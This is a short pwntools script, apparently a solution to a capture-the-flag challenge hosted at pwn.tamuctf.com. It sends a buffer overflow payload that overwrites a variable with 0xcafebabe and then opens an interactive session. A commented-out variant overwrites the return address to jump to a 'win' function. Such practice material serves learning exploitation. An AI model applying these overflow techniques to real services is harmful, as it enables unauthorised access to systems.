from pwn import *

# variable overwrite
io = remote('pwn.tamuctf.com', 4321)
payload = b'A' * 64 + p32(0xcafebabe)
io.sendline(payload)
io.interactive()


# RIP overwrite
# elf = ELF('vulnerable', checksec=True)
# rop = ROP(elf)
# ret = (rop.find_gadget(['ret']))[0]
# win_addr = elf.symbols['win']
# io = remote('pwn.tamuctf.com', 4321)
# payload = b'A' * (64+4) + p32(ret) + p32(win_addr)
# io.sendline(payload)
# io.interactive()